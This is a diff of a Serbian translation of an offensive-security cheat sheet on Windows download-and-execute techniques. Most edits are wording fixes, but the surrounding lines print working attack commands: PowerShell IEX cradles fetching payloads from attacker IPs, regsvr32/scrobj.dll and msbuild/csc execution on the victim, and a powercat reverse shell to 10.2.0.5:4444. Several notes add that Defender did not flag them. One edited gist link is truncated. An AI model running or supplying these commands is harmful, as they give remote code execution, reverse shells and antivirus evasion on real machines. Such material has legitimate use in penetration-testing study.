@@ -82,7 +82,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Proces koji izvršava mrežni poziv: **powershell.exe**\
-Payload napisan na disku: **NE** (_barem nigde gde sam mogao da pronađem koristeći procmon !_ )
+Payload napisan na disku: **NE** (_barem nigde gde sam mogao da pronađem koristeći procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Odavde**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -324,7 +324,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Nije otkriveno**
 
-**Možete lako preuzeti i izvršiti Koadic zombija koristeći stager wmic**
+**Možete vrlo lako preuzeti i izvršiti Koadic zombija koristeći stager wmic**
 
 ## Msbuild
 
@@ -341,7 +341,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Kompajlirajte C# kod na žrtvenoj mašini.
+Kompajlirajte C# kod na mašini žrtve.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -383,7 +383,7 @@ Pokrenite skriptu na veb serveru i izvršite je na strani žrtve:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender još uvek ne prepoznaje kao zlonamerni kod (do sada, 3/04/2019).
+Defender ne prepoznaje kao zlonamerni kod (još, 3/04/2019).
 
 **TODO: Proveriti druge nishang shell-ove**
 
@@ -395,9 +395,9 @@ Preuzmite, pokrenite veb server, pokrenite slušalac i izvršite ga na strani ž
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender ga ne prepoznaje kao zlonamerni kod (još, 3/04/2019).
+Defender ne prepoznaje to kao zlonamerni kod (još, 3/04/2019).
 
-**Druge opcije koje nudi powercat:**
+**Ostale opcije koje nudi powercat:**
 
 Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
@@ -447,7 +447,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ## Više
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS konzola sa nekim ofanzivnim PS modulima unapred učitanim (šifrovano)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim PS modulima i detekcijom proksija (IEX)
 
 ## Reference
